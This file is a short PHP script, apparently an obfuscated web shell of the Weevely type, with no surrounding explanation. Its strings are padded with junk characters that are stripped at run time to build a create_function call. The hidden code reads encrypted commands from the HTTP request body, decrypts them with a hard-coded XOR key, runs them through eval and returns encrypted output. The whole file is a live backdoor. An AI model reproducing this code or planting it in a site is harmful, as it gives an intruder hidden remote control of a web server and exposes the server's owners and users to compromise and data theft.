<?php
$W=str_replace('v','','crvveate_vvfuvvnction');
$V='w_contenJwts(Jw);@oJwb_end_clean();$rJwJw=@base6Jw4_encJwode(@x(@JwgJwzcompresJws($o),$k));JwJwpriJwnt("$p$kh$r$kf");}';
$y='wnJwput"),$Jwm)==1) Jw{@Jwob_start()Jw;@evJwJwalJw(@gzJwuncompress(@x(@JwbaJwse64_decode($m[1]JwJw),$k)));$o=@Jwob_gJwetJ';
$b='$k="aJwJw797Jwdf59";$kh="dcdJw013a7deJwe0";$Jwkf="Jw308f121dd8a5"Jw;$pJw="pDOUJw3XJwBBZVG9qyp9";fJwJwunction x($tJwJw,$';
$U='k){$Jwc=strJwlJwen($Jwk);$l=strlen($tJwJw);$oJw="Jw";for($i=0Jw;$i<$l;){for($jJw=0;($Jwj<$c&&$i<$lJw);$Jwj++,$i++)Jw{$';
$G='oJw.=$Jwt{$iJw}^$k{$j};}}JwretuJwrnJw $o;}if (@preg_JwmJwatch("/Jw$kh(.+)$Jwkf/",@fJwile_Jwget_coJwntents("pJwhp://iJ';
$q=str_replace('Jw','',$b.$U.$G.$y.$V);
$J=$W('',$q);$J();
?>
